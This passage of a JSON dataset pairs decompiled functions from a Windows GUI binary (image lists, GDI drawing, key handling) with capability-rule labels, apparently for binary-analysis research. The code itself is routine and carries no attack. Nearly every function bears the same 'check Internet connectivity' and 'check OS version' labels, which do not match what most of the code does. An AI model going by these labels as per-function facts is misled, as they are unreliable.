0x448c30);\n                *0x485b08 = sub.kernel32.dll_GetProcAddress_1(*0x483cf0, 0x448c44);\n                *0x485b0c = sub.kernel32.dll_GetProcAddress_1(*0x483cf0, 0x448c5c);\n                *0x485b10 = sub.kernel32.dll_GetProcAddress_1(*0x483cf0, 0x448c74);\n                *0x485b14 = sub.kernel32.dll_GetProcAddress_1(*0x483cf0, 0x448c88);\n                *0x485b18 = sub.kernel32.dll_GetProcAddress_1(*0x483cf0, 0x448ca0);\n                *0x485b1c = sub.kernel32.dll_GetProcAddress_1(*0x483cf0, 0x448cb8);\n                *0x485b20 = sub.kernel32.dll_GetProcAddress_1(*0x483cf0, 0x448cd4);\n                *0x485b24 = sub.kernel32.dll_GetProcAddress_1(*0x483cf0, 0x448ce0);\n            }\n        }\n        *in_FS_OFFSET = in_stack_ffffffd8;\n        sub.kernel32.dll_SetErrorMode(uVar1, 0x448bf5);\n        return;\n    }\n    return;\n}\n",
        "token_count": 639
    },
    "00448cf0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00448cf0(void)\n\n{\n    uint uVar1;\n    \n    if (*0x485afc != NULL) {\n        uVar1 = (**0x485afc)();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 55
    },
    "00448d0c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00448d0c(uint param_1, uint8_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uStack44;\n    uint uStack40;\n    uint32_t uStack36;\n    uchar *puStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uchar auStack20 [8];\n    \n    if ((*(*0x484858 + 0xc) != '\\0') && (param_2 != 3)) {\n        if (param_2 == 0) {\n            uStack24 = 0x448d3b;\n            fcn.00448cf0();\n        }\n        else {\n            uStack24 = 0x448d49;\n            fcn.00448cf0();\n            if (*0x483cf0 != 0) {\n                puStack28 = 0x448d5d;\n                puStack32 = &stack0xffffffe8;\n                uVar1 = (**0x485b00)();\n                if (uVar1 != 0) {\n                    puStack28 = &stack0xffffffec;\n                    uStack40 = 0x448d74;\n                    uStack36 = uVar1;\n                    (**0x485b08)();\n                    uStack44 = uVar1;\n                    if (param_2 == 1) {\n                        uStack40 = 0;\n                        (**0x485b10)();\n                    }\n                    else if (param_2 == 2) {\n                        uStack40 = 1;\n                        (**0x485b10)();\n                    }\n                    else {\n                        uStack40 = 1;\n                        (**0x485b10)();\n                        (**0x485b08)(uVar1, &stack0xffffffd4, &stack0xffffffd8);\n                        uStack44 = uStack44 & 0xfffffff4 | *(param_2 + 0x483cf0);\n                    }\n                    (**0x485b0c)(uVar1, uStack44, uStack40);\n                    (**0x485b04)();\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 454
    },
    "00448de8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00448de8(void)\n\n{\n    uint uVar1;\n    \n    if (*0x483cf0 != 0) {\n        uVar1 = (**0x485b20)();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 58
    },
    "00448dfc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00448dfc(void)\n\n{\n    ushort extraout_var;\n    ushort extraout_var_00;\n    \n    fcn.00403820();\n    **0x48466c = 0;\n    fcn.00403820();\n    **0x484828 = 0;\n    fcn.00403820();\n    *0x485aa8 = 0;\n    fcn.00403820();\n    sub.kernel32.dll_GlobalDeleteAtom(CONCAT22(extraout_var, *0x485ab6));\n    fcn.004045c8();\n    sub.kernel32.dll_GlobalDeleteAtom(CONCAT22(extraout_var_00, *0x485ab4));\n    fcn.004045c8();\n    if (*0x483cf0 != 0) {\n        sub.kernel32.dll_FreeLibrary_1(*0x483cf0);\n    }\n    return;\n}\n",
        "token_count": 190
    },
    "00449858": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.00449858(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.0042273c();\n    uVar1 = fcn.004037f0();\n    *(in_EAX + 0x30) = uVar1;\n    iVar2 = fcn.004037f0();\n    *(in_EAX + 0x34) = iVar2;\n    *(iVar2 + 0xc) = in_EAX;\n    *(iVar2 + 8) = 0x4499dc;\n    *(in_EAX + 0x58) = 0;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 271
    },
    "00449ad4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00449ad4(void)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int16_t iVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    \n    fcn.004543c4();\n    iVar3 = fcn.0044ca70();\n    if ((iVar3 != 0) && (iVar6 = *(*(in_EAX + 0x30) + 8),  -1 < iVar6 + -1)) {\n        iVar7 = 0;\n        do {\n            piVar1 = *(*(*(in_EAX + 0x30) + 4) + iVar7 * 4);\n            cVar2 = fcn.004039b8();\n            if (cVar2 != '\\0') {\n                if (iVar3 == *(piVar1 + 0x21)) {\ncode_r0x00449b4b:\n                    uVar5 = (**(*piVar1 + 0x50))();\n                    goto code_r0x00449b5a;\n                }\n                if (piVar1[0x24] != 0) {\n                    fcn.0044a2dc();\n                    iVar4 = fcn.0044a33c();\n                    if (iVar4 != -1) goto code_r0x00449b4b;\n                }\n            }\n            iVar7 = iVar7 + 1;\n            iVar6 = iVar6 + -1;\n        } while (iVar6 != 0);\n    }\n    uVar5 = 0;\ncode_r0x00449b5a:\n    return CONCAT44(in_EAX, uVar5);\n}\n",
        "token_count": 376
    },
    "00449e48": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00449e48(uint param_1, char param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*(in_EAX + 0x1a) != '\\0') {\n        return;\n    }\n    *(in_EAX + 0x1a) = 1;\n    uStack28 = 0x449f40;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    if (param_2 != *(in_EAX + 0x69)) {\n        iVar4 = *(in_EAX[0x14] + 8);\n        puVar1 = &stack0xfffffffc;\n        if (-1 < iVar4 + -1) {\n            do {\n                puStack24 = puVar1;\n                piVar3 = fcn.004039dc();\n                if (piVar3 != NULL) {\n                    (**(*piVar3 + 0x50))();\n                }\n                iVar4 = iVar4 + -1;\n                puVar1 = puStack24;\n            } while (iVar4 != 0);\n        }\n        *(in_EAX + 0x69) = param_2;\n        if (((0 < in_EAX[0x1b]) && (*(in_EAX + 0x69) != '\\0')) && (iVar4 = fcn.004499a0(),  -1 < iVar4 + -1)) {\n            do {\n                piVar3 = fcn.0044998c();\n                if (((piVar3 != in_EAX) && (cVar2 = fcn.004039b8(),  cVar2 != '\\0')) && (piVar3[0x1b] == in_EAX[0x1b]))\n                {\n                    fcn.00449e48();\n                }\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n        (**(*in_EAX + 0x30))();\n    }\n    *in_FS_OFFSET = uStack32;\n    *(in_EAX + 0x1a) = 0;\n    return;\n}\n",
        "token_count": 534
    },
    "00449f50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00449f50(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    if (param_2 != *(in_EAX + 0x6a)) {\n        if (in_EAX[0x17] != 0) {\n            cVar1 = *(in_EAX[0x17] + 0x58);\n            if (cVar1 == '\\x01') {\n                *(in_EAX + 0x6a) = param_2;\n                return;\n            }\n            if (cVar1 == '\\x02') {\n                param_2 = '\\x01';\n            }\n        }\n        iVar3 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar3 + -1) {\n            do {\n                piVar2 = fcn.004039dc();\n                if (piVar2 != NULL) {\n                    (**(*piVar2 + 0x54))();\n                }\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        *(in_EAX + 0x6a) = param_2;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 295
    },
    "0044a2dc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0044a2dc(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 0x90) == 0) {\n        uVar1 = fcn.004037f0();\n        *(in_EAX + 0x90) = uVar1;\n    }\n    return *(in_EAX + 0x90);\n}\n",
        "token_count": 89
    },
    "0044a628": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044a628(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x44a6d5;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    uVar1 = fcn.004037f0();\n    *(in_EAX + 0x4c) = uVar1;\n    if (((*(in_EAX + 0x30) < 1) || (0x8000 < *(in_EAX + 0x30))) || (*(in_EAX + 0x34) < 1)) {\n        fcn.0040675c();\n        fcn.0040c8dc();\n        fcn.00403fc0();\n    }\n    *(in_EAX + 0x38) = 4;\n    *(in_EAX + 0x41) = 1;\n    fcn.0044b134();\n    *(in_EAX + 0x43) = 0;\n    *(in_EAX + 0x44) = 0x1fffffff;\n    *(in_EAX + 0x48) = 0x1fffffff;\n    uVar1 = fcn.0042b3a8();\n    *(in_EAX + 0x50) = uVar1;\n    fcn.0044a6f4();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x44a6dc;\n    uStack20 = 0x44a6d4;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 400
    },
    "0044a6e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0044a6e0(void)\n\n{\n    uint32_t in_EAX;\n    \n    return in_EAX & 0xffffff00 | *(in_EAX + 0x3c) != 0;\n}\n",
        "token_count": 52
    },
    "0044a6e8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044a6e8(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x3c) == 0) {\n        fcn.0044a8b8();\n    }\n    return;\n}\n",
        "token_count": 58
    },
    "0044a82c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044a82c(int32_t *param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    fcn.0044b0bc();\n    if (param_2 == NULL) {\n        (**(**(in_EAX + 0x50) + 100))();\n    }\n    else {\n        cVar1 = fcn.0042b9e4();\n        if (cVar1 == '\\x01') {\n            (**(*param_2 + 100))();\n        }\n        else {\n            (**(*param_1 + 8))();\n            (**(*param_1 + 0x6c))();\n            (**(*param_1 + 100))();\n        }\n    }\n    return;\n}\n",
        "token_count": 174
    },
    "0044a880": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044a880(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    cVar1 = fcn.0044a6e0();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x42) == '\\0')) {\n        uVar2 = fcn.0044a81c();\n        sub.comctl32.dll_ImageList_Destroy(uVar2);\n    }\n    *(in_EAX + 0x3c) = 0;\n    fcn.00403a28();\n    return;\n}\n",
        "token_count": 132
    },
    "0044ab40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044ab40(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t *piVar3;\n    uint in_EDX;\n    uint var_28h;\n    uint var_18h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = in_EDX;\n    cVar1 = fcn.0044a6e0();\n    if (cVar1 != '\\0') {\n        if (arg_8h == '\\0') {\n            if (*(in_EAX + 0x54) == 0) {\n                piVar3 = fcn.0042b3a8();\n                *(in_EAX + 0x54) = piVar3;\n                fcn.0042c6e8();\n                (**(*piVar3 + 0x40))();\n                (**(*piVar3 + 0x34))();\n            }\n            fcn.0042b978();\n            fcn.00426904();\n            fcn.0041b080(&var_28h, *(in_EAX + 0x30));\n            fcn.0042b978(&var_28h);\n            fcn.00426ca8();\n            fcn.0042b978(0, 0, 0, 0, 0xffffffff, 0, 0);\n            uVar2 = fcn.0042704c();\n            uVar2 = fcn.0044a81c(var_4h, uVar2);\n            sub.comctl32.dll_ImageList_DrawEx(uVar2);\n            fcn.0041b080(&var_18h, arg_10h + *(in_EAX + 0x30));\n            fcn.0042b978();\n            var_8h = fcn.0042704c();\n            fcn.00426904();\n            uVar2 = fcn.0042704c();\n            sub.gdi32.dll_SetTextColor(uVar2, 0xffffff);\n            sub.gdi32.dll_SetBkColor(uVar2, 0);\n            sub.gdi32.dll_BitBlt\n                      (uVar2, arg_14h + 1, arg_10h + 1, *(in_EAX + 0x34), *(in_EAX + 0x30), var_8h, 0, 0, 0xe20746);\n            fcn.00426904();\n            uVar2 = fcn.0042704c();\n            sub.gdi32.dll_SetTextColor(uVar2, 0xffffff);\n            sub.gdi32.dll_SetBkColor(uVar2, 0);\n            sub.gdi32.dll_BitBlt(uVar2, arg_14h, arg_10h, *(in_EAX + 0x34), *(in_EAX + 0x30), var_8h, 0, 0, 0xe20746);\n        }\n        else {\n            uVar2 = fcn.0044a530(arg_ch);\n            fcn.0044ab18(uVar2);\n            uVar2 = fcn.0044a530();\n            uVar2 = fcn.0042704c(arg_14h, arg_10h, 0, 0, uVar2);\n            uVar2 = fcn.0044a81c(var_4h, uVar2);\n            sub.comctl32.dll_ImageList_DrawEx(uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 792
    },
    "0044b338": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0044b338(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    if (*(*(arg_8h + -4) + 0x20) == 0) {\n        iVar2 = fcn.0044aa24();\n        return 0 < iVar2;\n    }\n    cVar1 = fcn.004039b8();\n    if ((cVar1 != '\\0') && (cVar1 = fcn.0044b248(),  cVar1 != '\\0')) {\n        return false;\n    }\n    return true;\n}\n",
        "token_count": 136
    },
    "0044b3ec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044b3ec(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puVar3;\n    int32_t iStack112;\n    uint uStack108;\n    uchar *puStack104;\n    int32_t iStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint var_40h;\n    uint var_30h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    puStack84 = 0x44b409;\n    var_4h = in_EAX;\n    fcn.0041ebbc();\n    puStack84 = 0x44b418;\n    fcn.0041ebbc();\n    puStack84 = 0x44b424;\n    var_8h = fcn.0042b3a8();\n    uStack88 = 0x44b670;\n    iStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    iVar1 = fcn.0041e990();\n    (**(*var_8h + 0x54))();\n    puStack104 = 0x44b457;\n    fcn.0041e9b0(var_18h + iVar1, var_18h + iVar1 >> 0x1f);\n    puStack104 = 0x44b463;\n    var_10h = fcn.0042b3a8();\n    uStack108 = 0x44b653;\n    iStack112 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff90;\n    puStack104 = &stack0xfffffffc;\n    (**(*var_10h + 0x54))();\n    var_ch = fcn.0042b3a8();\n    (**(*var_ch + 0x40))();\n    (**(*var_ch + 0x34))();\n    var_14h = fcn.0042b3a8();\n    fcn.0042c6e8();\n    (**(*var_14h + 0x40))();\n    (**(*var_14h + 0x34))();\n    fcn.0041b080(&fcn.0044b3ec::var_30h, *(var_4h + 0x30));\n    fcn.0044ba40();\n    puVar3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff7c;\n    iVar1 = (**(*var_8h + 0x20))();\n    iVar1 = iVar1 / *(var_4h + 0x30);\n    if (-1 < iVar1 + -1) {\n        do {\n            var_20h = iVar1;\n            if (var_1ch == 0) break;\n            iVar1 = (**(*var_8h + 0x2c))();\n            iVar1 = iVar1 / *(var_4h + 0x34);\n            if (-1 < iVar1 + -1) {\n                do {\n                    if (var_1ch == 0) break;\n                    fcn.0041b0a8(&fcn.0044b3ec::var_40h, *(var_4h + 0x30));\n                    puVar3 = &fcn.0044b3ec::var_40h;\n                    uVar2 = fcn.0042b978();\n                    fcn.0042b978(uVar2);\n                    fcn.00426b74(puVar3);\n                    fcn.0041b0a8(&fcn.0044b3ec::var_40h, *(var_4h + 0x30));\n                    puVar3 = &fcn.0044b3ec::var_40h;\n                    uVar2 = fcn.0042b978();\n                    fcn.0042b978(uVar2);\n                    fcn.00426b74(puVar3);\n                    fcn.0044a958();\n                    var_1ch = var_1ch + -1;\n                    iVar1 = iVar1 + -1;\n                } while (iVar1 != 0);\n            }\n            var_20h = var_20h + -1;\n            iVar1 = var_20h;\n        } while (var_20h != 0);\n    }\n    *in_FS_OFFSET = puVar3;\n    fcn.00403820();\n    fcn.00403820();\n    fcn.0044ba44();\n    return;\n}\n",
        "token_count": 1063
    },
    "0044b8fc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044b8fc(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_4h;\n    \n    if (*0x485b30 == 0) {\n        *0x485b30 = fcn.0040d17c();\n        if (0x5ffff < *0x485b30) {\n            iVar1 = sub.kernel32.dll_GetModuleHandleA_2();\n            if (iVar1 != 0) {\n                *0x485b34 = sub.kernel32.dll_GetProcAddress_1();\n            }\n        }\n    }\n    puStack40 = 0x44b95b;\n    iVar1 = fcn.00423244(0);\n    uStack44 = 0x44b9f6;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    if (*0x485b34 == NULL) {\n        if (iVar1 != 0) {\n            iVar1 = iVar1 + 0x14;\n        }\n        puStack40 = &stack0xfffffffc;\n        uVar3 = fcn.0044a81c(iVar1);\n        iVar1 = sub.comctl32.dll_ImageList_Write();\n        if (iVar1 == 0) {\n            fcn.0040c998();\n            fcn.00403fc0();\n        }\n    }\n    else {\n        if (iVar1 != 0) {\n            iVar1 = iVar1 + 0x14;\n        }\n        uVar3 = 1;\n        puStack40 = &stack0xfffffffc;\n        uVar2 = fcn.0044a81c(1, iVar1);\n        iVar1 = (**0x485b34)(uVar2);\n        if (iVar1 != 0) {\n            fcn.0040c998();\n            fcn.00403fc0();\n        }\n    }\n    *in_FS_OFFSET = uVar3;\n    uStack48 = 0x44b9fd;\n    fcn.00403820();\n    return;\n}\n",
        "token_count": 479
    },
    "0044ba44": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044ba44(void)\n\n{\n    int32_t in_EAX;\n    \n    if (0 < *(in_EAX + 0x5c)) {\n        *(in_EAX + 0x5c) = *(in_EAX + 0x5c) + -1;\n    }\n    if (*(in_EAX + 0x58) != '\\0') {\n        *(in_EAX + 0x58) = 0;\n        fcn.00403a28();\n    }\n    return;\n}\n",
        "token_count": 115
    },
    "0044cafc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Removing unreachable block (ram,0x0044cc77)\n// WARNING: Removing unreachable block (ram,0x0044cc84)\n// WARNING: Removing unreachable block (ram,0x0044cc91)\n// WARNING: Removing unreachable block (ram,0x0044cc97)\n// WARNING: Removing unreachable block (ram,0x0044cca4)\n// WARNING: Removing unreachable block (ram,0x0044ccaa)\n// WARNING: Removing unreachable block (ram,0x0044ccb7)\n\nvoid fcn.0044cafc(void)\n\n{\n    uint8_t in_AL;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    puStack28 = &fcn.0044cafc::var_2h + 2;\n    uStack32 = 0x44cce5;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uVar1 = in_AL;\n    if (in_AL < 0x2d) {\n        if (uVar1 - 8 < 2) {\n            puStack28 = &fcn.0044cafc::var_2h + 2;\n            fcn.00404660();\n            goto code_r0x0044cc71;\n        }\n        if (uVar1 == 0xd) {\n            puStack28 = &fcn.0044cafc::var_2h + 2;\n            fcn.00404660();\n            goto code_r0x0044cc71;\n        }\n        if (uVar1 == 0x1b) {\n            puStack28 = &fcn.0044cafc::var_2h + 2;\n            fcn.00404660();\n            goto code_r0x0044cc71;\n        }\n        if (uVar1 - 0x20 < 9) {\n            puStack28 = &fcn.0044cafc::var_2h + 2;\n            fcn.00404660();\n            goto code_r0x0044cc71;\n        }\n    }\n    else if (in_AL < 0x41) {\n        if (uVar1 - 0x2d < 2) {\n            puStack28 = &fcn.0044cafc::var_2h + 2;\n            fcn.00404660();\n            goto code_r0x0044cc71;\n        }\n        if (uVar1 - 0x30 < 10) {\n            puStack28 = &fcn.0044cafc::var_2h + 2;\n            fcn.004047b0();\n            goto code_r0x0044cc71;\n        }\n    }\n    else {\n        if (uVar1 - 0x41 < 0x1a) {\n            fcn.004047b0();\n            goto code_r0x0044cc71;\n        }\n        if (uVar1 - 0x60 < 10) {\n            puStack28 = &fcn.0044cafc::var_2h + 2;\n            fcn.004047b0();\n            goto code_r0x0044cc71;\n        }\n        if (uVar1 - 0x70 < 0x18) {\n            puStack28 = &fcn.0044cafc::var_2h + 2;\n            fcn.00408c28();\n            fcn.004048d4();\n            goto code_r0x0044cc71;\n        }\n    }\n    puStack28 = &fcn.0044cafc::var_2h + 2;\n    fcn.0044caa8();\ncode_r0x0044cc71:\n    fcn.004045c8();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x44ccec;\n    uStack32 = 0x44cce4;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 905
    },
    "0044cd5c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044cd5c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int16_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x44cd75;\n    fcn.00404a78();\n    uStack32 = 0x44ce37;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    do {\n        do {\n            cVar1 = fcn.0044cd00();\n        } while (cVar1 != '\\0');\n        cVar1 = fcn.0044cd00();\n    } while (((cVar1 != '\\0') || (cVar1 = fcn.0044cd00(),  cVar1 != '\\0')) || (cVar1 = fcn.0044cd00(),  cVar1 != '\\0'));\n    if (in_EAX != 0) {\n        iVar3 = 8;\n        do {\n            fcn.0044cafc();\n            iVar2 = fcn.00408ab8();\n            if (iVar2 == 0) break;\n            iVar3 = iVar3 + 1;\n        } while (iVar3 != 0x256);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x44ce3e;\n    uStack32 = 0x44ce36;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 370
    },
    "0044ce74": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
